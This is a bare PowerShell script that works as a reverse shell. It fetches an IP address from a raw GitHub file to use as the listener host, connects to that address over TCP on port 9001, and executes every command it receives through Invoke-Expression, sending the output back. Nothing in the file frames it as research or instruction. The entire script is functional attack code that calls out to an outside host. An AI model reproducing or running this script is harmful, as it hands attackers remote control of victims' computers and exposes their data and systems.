# Define the URL to fetch the IP address from
$url = "https://raw.githubusercontent.com/Dobrica111/kurcastikurton/main/ip"

# Attempt to get the IP address from the file
try {
    $ipContent = Invoke-WebRequest -Uri $url -UseBasicParsing
    $ipAddress = $ipContent.Content.Trim()

    # Validate the IP address format
    if ($ipAddress -match '^\d{1,3}(\.\d{1,3}){3}$') {
        $LHOST = $ipAddress
        Write-Host "LHOST set to: $LHOST"
    } else {
        Write-Error "The content retrieved is not a valid IP address: '$ipAddress'"
    }
}
catch {
    Write-Error "Failed to retrieve IP from the URL. $_"
}

$LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
